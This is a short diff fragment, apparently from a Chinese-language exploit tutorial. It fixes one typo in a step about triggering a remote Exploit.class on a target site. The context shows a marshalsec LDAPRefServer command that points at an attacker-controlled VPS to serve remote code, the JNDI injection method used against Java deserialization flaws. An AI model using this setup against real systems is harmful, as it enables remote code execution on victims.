@@ -18,7 +18,7 @@
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “http://公网vpsHTTP的IP:端口/#Exploit” 9999
    ```
 
-4. 在目标网站上执行如下EXP即可出发Exploit.class中的命令
+4. 在目标网站上执行如下EXP即可触发Exploit.class中的命令
 
    ```json
    
